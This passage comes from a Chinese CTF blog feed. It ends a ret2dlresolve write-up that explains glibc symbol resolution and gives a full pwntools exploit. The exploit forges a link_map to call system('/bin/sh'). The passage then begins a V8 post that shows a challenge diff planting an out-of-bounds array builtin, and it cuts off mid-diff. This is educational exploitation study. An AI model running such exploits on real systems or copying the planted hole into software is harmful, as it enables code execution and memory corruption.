class="line">      &amp;&amp; (version-&gt;hidden || <span class="built_in">map</span>-&gt;l_versions[ndx].hash</span><br><span class="line">  || (verstab[symidx] &amp; <span class="number">0x8000</span>)))</span><br><span class="line">    <span class="comment">/* It&#x27;s not the version we want.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (verstab != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x7fff</span>)</span><br><span class="line">      &gt;= ((flags &amp; DL_LOOKUP_RETURN_NEWEST) ? <span class="number">2</span> : <span class="number">3</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Don&#x27;t accept hidden symbols.  */</span></span><br><span class="line">      <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x8000</span>) == <span class="number">0</span></span><br><span class="line">  &amp;&amp; (*num_versions)++ == <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* No version so far.  */</span></span><br><span class="line">*versioned_sym = sym;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There cannot be another entry for this symbol so stop here.  */</span></span><br><span class="line">  <span class="keyword">return</span> sym;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>check_match</code>函数中通过这条<code>if (version != NULL)</code>语句又分为了两条分支，肉眼可见的是上面的分支是较为严格的一条，而下面的则是较为简单的一条。不过显而易见的是这条分支的走向是由<code>version</code>变量决定的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>version</code>的由来就是上面的这段代码赋予的，所以如果我们可以控制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p>或者可以控制<code>ndx</code>都是可以解决的。</p><p>首先思考第二种方式，首先则是可以看到这里<code>ndx</code>中的计算方式<code>ELFW(R_SYM) (reloc-&gt;r_info)</code>和前面获取<code>sym</code>时是同一种运算方式。所以这一算式中的各个参数我们是优先保证sym的正确性的。不过<code>DT_SYMTAB</code>所处的段和<code>DT_VERSYM</code>所处的段是不一样的，这也是我们能够修改这里的依据之一，另一个依据则是<code>&amp;l-&gt;l_versions[0]</code>的内容是NULL。所以我们只需要让他为NULL即可。</p><p><code>DT_VERSYM</code>节的位置其实就是<code>.gnu.version</code>节的位置，所以首先通过<code>readelf</code>查看一下节的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Version symbols section <span class="string">&#x27;.gnu.version&#x27;</span> contains 7 entries:</span><br><span class="line">Addr: 0x00000000004003dc  Offset: 0x0003dc  Link: 5 (.dynsym)</span><br><span class="line">000:   0 (*<span class="built_in">local</span>*)       0 (*<span class="built_in">local</span>*)       2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br><span class="line">004:   3 (GLIBC_2.7)     2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br></pre></td></tr></table></figure><p>随后看一下程序在运行时的内存布局</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">        0x400000           0x401000 r-xp     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x600000           0x601000 r--p     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x601000           0x602000 rw-p     1000 1000   /ctf/work/download/todo/ezzzz</span><br></pre></td></tr></table></figure><p>可以看到<code>DT_VERSYM</code>所处的位置就是第一页中。</p><p>而在linux存在这样一种分页机制，如果当前页的使用不到<code>0x1000</code>其实也会返回一页，所以在没有使用完的情况下，页内可能存在空白数据也就是<code>\x00</code>。而这个段的结束位置则在<code>.eh_frame</code>可以看到地址为<code>0000000000400860</code>，那么当这个结束地址减去<code>.gnu.version</code>的地址则表示所取的<code>ndx</code>的偏移到<code>0x400860 ~ 0x401000</code>之间到最小值。</p><p>在x64和x32上<code>ElfW(Half)</code>的结构都是2个字节。所以上述的最小偏移是：<code>(0x400860-0x4003dc) / sizeof(ElfW(Half)) = 0x242</code></p><p>而我们需要把伪造的内容放到bss段上，随后计算最大偏移则是根据sym的获取进行计算<code>(0x602000-0x601000) /sizeof (Elf64_Sym) = 0xaa</code>。最终得到<code>0xaa &lt; 0x242</code>所以也就导致无法在满足ndx的同时拿到伪造的sym结构。**(不过32位是可以的，只需要在bss靠后的位置写sym结构体即可)**。</p><p>那么接着思考第一种方式，在只有栈溢出的情况下我们无法直接泄漏或修改<code>link_map</code>结构体中的内容，那么唯一可行的方法就是进行栈迁移在bss中伪造<code>link_map</code>，但是如果是走第一个分支就会出现一种情况了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lookup_t</span></span><br><span class="line">_dl_lookup_symbol_x (<span class="keyword">const</span> <span class="keyword">char</span> *undef_name, struct link_map *undef_map,</span><br><span class="line">     <span class="keyword">const</span> ElfW(Sym) **ref,</span><br><span class="line">     struct r_scope_elem *symbol_scope[],</span><br><span class="line">     <span class="keyword">const</span> struct r_found_version *version,</span><br><span class="line">     <span class="keyword">int</span> type_class, <span class="keyword">int</span> flags, struct link_map *skip_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> new_hash = _dl_new_hash (undef_name);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> old_hash = <span class="number">0xffffffff</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sym_val</span> <span class="title">current_value</span> =</span> &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">scope</span> =</span> symbol_scope;</span><br><span class="line"></span><br><span class="line">  bump_num_relocations ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DL_LOOKUP_RETURN_NEWEST does not make sense for versioned</span></span><br><span class="line"><span class="comment">     lookups.  */</span></span><br><span class="line">  assert (version == <span class="literal">NULL</span> || !(flags &amp; DL_LOOKUP_RETURN_NEWEST));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (skip_map != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">    <span class="keyword">while</span> ((*scope)-&gt;r_list[i] != skip_map)</span><br><span class="line">      ++i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> start = i; *scope != <span class="literal">NULL</span>; start = <span class="number">0</span>, ++scope)</span><br><span class="line">    <span class="keyword">if</span> (do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,</span><br><span class="line">     &amp;current_value, *scope, start, version, flags,</span><br><span class="line">     skip_map, type_class, undef_map) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>_dl_lookup_symbol_x</code>函数中搜索的方法是根据<code>scope</code>这个范围搜索的，而这个范围是通过<code>l-&gt;l_scope</code>获取的，所以如果我们在没有任何地址泄漏的情况下要想伪造<code>l_scope</code>是不现实的。那么唯一的方法是什么呢？</p><p>当然是走else语句了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br></pre></td></tr></table></figure><p>这里直接返回的是<code>link_map-&gt;l_addr + sym-&gt;d_val</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005c3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005c1</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x4003f6</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rsi_r15)+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(read_plt)+p64(elf.symbols[<span class="string">&#x27;fun&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">dynstr_addr = <span class="number">0x400318</span> <span class="comment"># str table</span></span><br><span class="line">fake_link_map_addr = bss+<span class="number">0x100</span></span><br><span class="line">r_offset = fake_link_map_addr + l_addr * -<span class="number">1</span> - <span class="number">8</span></span><br><span class="line">l_addr = l_addr &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)</span><br><span class="line">fake_strtab = p64(<span class="number">0</span>)+p64(dynstr_addr)</span><br><span class="line">fake_strtab_addr = fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">fake_symtab = p64(<span class="number">0</span>)+p64(read_got-<span class="number">0x8</span>)</span><br><span class="line">fake_symtab_addr = fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">fake_dynrel_addr = fake_link_map_addr+<span class="number">0x28</span></span><br><span class="line">fake_rel_addr = fake_link_map_addr+<span class="number">0x38</span></span><br><span class="line">fake_dynrel = p64(<span class="number">0</span>)+p64(fake_rel_addr)</span><br><span class="line">fake_rel = p64(r_offset)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_rel</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_dynrel_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">r.sendline(fake_link_map)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = fake_link_map_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(bin_sh_addr)+p64(read_load_plt) + \</span><br><span class="line">    p64(fake_link_map_addr)+p64(<span class="number">0</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里再次审视这段exp，可以发现<code>l_addr</code>其实就是<code>read</code>函数和<code>system</code>函数之间的差值，而<code>sym-&gt;d_val</code>就是<code>read</code>函数的地址，并且可以将这篇文章的代码进行编译会发现他的got表中<code>read</code>函数不是首位，第一个函数是<code>_libc_start_main</code>这也刚好可以让<code>sym-&gt;st_other</code>不为0从而进入else。</p><h3 id="与Full的差别"><a href="#与Full的差别" class="headerlink" title="与Full的差别"></a>与Full的差别</h3><p>可以很明显的看出来，这道题目所利用的方式其实是走的if分支而不是else，因为这道题压根没给libc所以无法计算偏移。虽然我在构造sym结构体的时候选择了<code>read@got - 8</code>的位置，但是属于是瞎猫碰到死耗子这个题目中的<code>read</code>就是got表中的第一个函数，所以才没有导致<code>sym-&gt;st_other</code>为非0。</p><p>可能大家会疑惑为什么这里能够走上面的if语句，又是因为运气好（可能是做题运气用完了，国赛啥都没抽到😭），在进行时ndx又是为0。当然如果不为0我们可以采取上面的第二种办法，直接覆盖<code>0x1d0</code>为0即可。</p><p><img   src="/images/image-20230728222143061.png"  alt="image-20230728222143061"></p><hr><p>参考链接：</p><p>​<a class="link"   href="https://inaz2.hatenablog.com/entry/2014/07/29/020112" >https://inaz2.hatenablog.com/entry/2014/07/29/020112<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41" >https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在先前其实我已经写过一篇&lt;a class=&quot;link&quot;   href=&quot;https://cv196082.gitee.io/2022/02/</summary>
      
    
    
    
    <category term="pwn" scheme="https://196082.github.io/categories/pwn/"/>
    
    
    <category term="dl-runtime-resolve" scheme="https://196082.github.io/tags/dl-runtime-resolve/"/>
    
    <category term="Full RELRO" scheme="https://196082.github.io/tags/Full-RELRO/"/>
    
  </entry>
  
  <entry>
    <title>v8初体验</title>
    <link href="https://196082.github.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://196082.github.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2023-06-27T12:05:06.000Z</published>
    <updated>2023-06-27T12:05:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段事情因为各种事情耽搁，一直没有更新文章。本打算新的一篇出<code>rootkit</code>来水一篇，后面发现a3佬写的太多了，不想继续看了。然后前阵子一直在思考后续到底是学什么方向，在docker逃逸、chrome内核、iot还有fuzz之间犹豫不决，现在也算是下定决心来学学chrome了，只希望能够快点搞完，后面还是打算更多的去学习docker逃逸。</p><p>这里就不提环境安装的事情了，网上有很多相关资料。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>js作为一个面向对象编程的语言，他的变量都是以类的形式表现的。并且js作为动态语言，他的类成员是可以改变的，这也就导致他在内存中的存在形式相交与C语言要复杂的多。</p><p>使用如下程序进行调试：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> int_arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span> : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> object_arr = [obj, obj, obj];</span><br><span class="line"><span class="keyword">var</span> newed_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">%DebugPrint(int_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(float_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(object_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(newed_arr);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>上面的<code>%DebugPrint(int_arr)</code>的作用是打印出<code>int_arr</code>的内存信息，也就是打印出内存地址。后面的<code>%SystemBreak()</code>函数则是将控制权交给gdb。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0x011117f8df01 &lt;JSArray[3]&gt;</span><br><span class="line">... ...</span><br><span class="line">pwndbg&gt; job 0x011117f8df01</span><br><span class="line">0x11117f8df01: [JSArray]</span><br><span class="line"> - map: 0x07bd46242d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df01-1</span><br><span class="line">00:0000│  0x11117f8df00 —▸ 0x7bd46242d99 ◂— 0x40000020b620c01</span><br><span class="line">01:0008│  0x11117f8df08 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">02:0010│  0x11117f8df10 —▸ 0x11117f8de19 ◂— 0x20b620c08</span><br><span class="line">03:0018│  0x11117f8df18 ◂— 0x300000000</span><br><span class="line">04:0020│  0x11117f8df20 —▸ 0x20b620c14f9 ◂— 0x20b620c01</span><br><span class="line">05:0028│  0x11117f8df28 ◂— 0x300000000</span><br><span class="line">06:0030│  0x11117f8df30 ◂— 0x3ff199999999999a</span><br><span class="line">07:0038│  0x11117f8df38 ◂— 0x3ff3333333333333</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8de19-1</span><br><span class="line">00:0000│  0x11117f8de18 —▸ 0x20b620c0851 ◂— 0x20b620c01</span><br><span class="line">01:0008│  0x11117f8de20 ◂— 0x300000000</span><br><span class="line">02:0010│  0x11117f8de28 ◂— 0x100000000</span><br><span class="line">03:0018│  0x11117f8de30 ◂— 0x200000000</span><br><span class="line">04:0020│  0x11117f8de38 ◂— 0x300000000</span><br><span class="line">05:0028│  0x11117f8de40 —▸ 0x20b620c0801 ◂— 0x20b620c01</span><br><span class="line">06:0030│  0x11117f8de48 ◂— 0x300000000</span><br><span class="line">07:0038│  0x11117f8de50 —▸ 0xeff64df451 ◂— 0x9a0000020b620c05</span><br></pre></td></tr></table></figure><p>从上面可以看到，这里打印出来的是一个int类型的数组，在使用job命令可以清晰的看到这块内存的数据结构。首先是一个指向map的指针，随后在job显示的和<code>telescope</code>出来的内容有一定出入，这里我选择相信<code>telescope</code>，所以第二个成员应该是<code>properties</code>，随后就是<code>elements</code>指针，最后就是<code>length</code>。可以看出来<code>elements</code>指针就是真正指向数据的指针，并且在后面紧跟了<code>elements</code>内存区域的结构。</p><h2 id="starCTF-oob"><a href="#starCTF-oob" class="headerlink" title="starCTF oob"></a>starCTF oob</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ 